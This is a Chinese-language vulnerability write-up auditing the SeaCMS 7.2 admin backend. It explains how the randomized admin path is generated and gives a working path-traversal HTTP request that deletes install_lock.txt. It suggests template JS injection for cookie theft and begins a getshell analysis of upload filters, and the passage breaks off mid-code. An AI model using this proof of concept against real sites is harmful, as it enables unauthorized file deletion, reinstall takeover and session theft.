## Seacms7.2-任意文件删除&Getshell（后台篇）
> code:`https://www.seacms.net`  
>  Version:`7.2`
### 0x01 前言
小伙伴在群里丢了个站说指纹识别出来是seacms 百度找到的已知漏洞均无效 于是就审计一下咯。
本来想照样黑盒测试
发现前台在测[74cms任意文件夹删除](https://xz.aliyun.com/t/3788)时payload的目录没注意多写了两层
平常积累的各种工具 写的代码全被格了 没有备份...
![B7C804FC7B1293C44690B9E4EA2636A0]
### 0x02 过程
打开代码目录注意到版本号和dedecms一样 写到了`ver.txt`里 实战中可先看一下版本 再使用对应exp。
版本查看：
    http://host.com/data/admin/ver.txt
安装完发现后台目录并不是有规律的单词一类的 看了下`/install/index.php`文件的代码第279-299中有个randomkeys函数
    function randomkeys($length)   
        {   
        $pattern = 'abcdefgh1234567890jklmnopqrstuvwxyz';  
        for($i=0;$i<$length;$i++)   
        {   
            $key .= $pattern{mt_rand(0,35)}; 
        }   
        return $key;   
        }
        $newadminname=randomkeys(6);
        $jpath='../admin';
        $xpath='../'.$newadminname;
        $cadmin=rename($jpath,$xpath);
        if($cadmin==true){$cadmininfo='【重要】：后台管理地址：'.$baseurl.'/'.$newadminname;}
        else{$cadmininfo='【重要】：后台管理地址：'.$baseurl.'/admin';}
        include('./templates/step-5.html');
        exit();
    }
randomkeys函数是生成随机字符串的 `$newadminname`调用并取了一个六位的字符串
随后将默认的admin目录重命名为这个随机的字符串。bp爆破payload设置方式如下：
#### 0x02_1 任意文件删除
看到后台目录下的admin_template.php时发现法：  
前30行代码为
    <?php
    require_once(dirname(__FILE__)."/config.php");
    if(empty($action))
    {
        $action = '';
    }
    $dirTemplate="../templets";
    if($action=='edit')
    {
        if(substr(strtolower($filedir),0,11)!=$dirTemplate){
            ShowMsg("只允许编辑templets目录！","admin_template.php");
            exit;
        }
        $filetype=getfileextend($filedir);
        if ($filetype!="html" && $filetype!="htm" && $filetype!="js" && $filetype!="css" && $filetype!="txt")
        {
            ShowMsg("操作被禁止！","admin_template.php");
            exit;
        }
        $filename=substr($filedir,strrpos($filedir,'/')+1,strlen($filedir)-1);
        $content=loadFile($filedir);
        $content = m_eregi_replace("<textarea","##textarea",$content);
        $content = m_eregi_replace("</textarea","##/textarea",$content);
        $content = m_eregi_replace("<form","##form",$content);
        $content = m_eregi_replace("</form","##/form",$content);
        include(sea_ADMIN.'/templets/admin_template.htm');
        exit();
    }
`$dirTemplate`固定了仅为`../templets`目录 并在编辑前取了路径的前11位字符串来和`../templets`对比
如果不等就提示只允许编辑templets目录！那么你不允许我编辑`../templets`前的路径来遍历文件目录 我编辑后面的来遍历呢？
的确可行 但是没法编辑或者读文件 因为
    if ($filetype!="html" && $filetype!="htm" && $filetype!="js" && $filetype!="css" && $filetype!="txt")
        {
            ShowMsg("操作被禁止！","admin_template.php");
            exit;
        }
在编辑或读取文件后程序会先验证一遍文件后缀 限制了紧紧允许编辑html htm js css txt这四种文件 实战中此处可利用来插入js代码
获取cookie 维权使用。
跟随看到下面的第114-132行
    elseif($action=='del')
    {
        if($filedir == '')
        {
            ShowMsg('未指定要删除的文件或文件名不合法', '-1');
            exit();
        }
        if(substr(strtolower($filedir),0,11)!=$dirTemplate){
            ShowMsg("只允许删除templets目录内的文件！","admin_template.php");
            exit;
        }
        $folder=substr($filedir,0,strrpos($filedir,'/'));
        if(!is_dir($folder)){
            ShowMsg("目录不存在！","admin_template.php");
            exit;
        }
        unlink($filedir);
        ShowMsg("操作成功！","admin_template.php?path=".$folder);
        exit;
    }
可以注意到此处并未像上面一样限制后缀 即可即可遍历到上级目录取删除指定任意文件。
POC（删除install_lock.txt文件）：
    GET /qdybap/admin_template.php?action=del&filedir=../templets/default/images/../../../install/install_lock.txt HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate
    Referer: http://127.0.0.1/qdybap/admin_template.php?path=../templets/default/images
    Connection: close
    Cookie: think_template=default; __tins__19820877=%7B%22sid%22%3A%201546784203337%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201546786104291%7D; __51cke__=; __51laig__=6; PHPSESSID=5322944de96922c98817ca8b2463c379; __tins__19820873=%7B%22sid%22%3A%201546784394633%2C%20%22vd%22%3A%202%2C%20%22expires%22%3A%201546786703612%7D
    Upgrade-Insecure-Requests: 1
效果：
跟随看到下面的代码 看到第164行代码为：
    createTextFile($content,$filedir."/self_".$name.".html");
创建的文件的后缀直接写死了的 这意味着无法通过此处写入shell。  
那么就没办法了么？
#### 0x02_2 Getshell
关于Getshell 笔者从中午一点 一直研究到下午五点 终于终于绕过重重限制了！！！
##### 0x02_2_1 第一次绝望
先看上传的限制：
    /include/uploadsafe.inc.php: 
       12  //为了防止用户通过注入的可能性改动了数据库 
       13: //这里强制限定的某些文件类型禁止上传
       14  $cfg_not_allowall = "php|pl|cgi|asp|asa|cer|aspx|jsp|php3|shtm|shtml";
       15  $keyarr = array('name','type','tmp_name','size');
直接写死 不允许上传php文件
后台目录下的/uploads.php:
第48行：
    var $allowExts = array('jpg', 'gif',  'png', 'rar', 'zip', 'bmp');
白名单写死
##### 0x02_2_2 第二次绝望
最让人绝望的是另一处
看起来是可以改配置的
实际上
`/Users/CoolCat/php/qdybap/admin_config_mark.php`第25-52行
    if(is_uploaded_file($newimg))
        {
            $allowimgtype= explode('|',$cfg_imgtype);
            $finfo=pathinfo($newimg_name);
            $imgfile_type = $finfo['extension'];
            if(!in_array($imgfile_type,$allowimgtype))
            {
                ShowMsg("上传的图片格式错误，请使用 {$cfg_photo_support}格式的其中一种！","-1");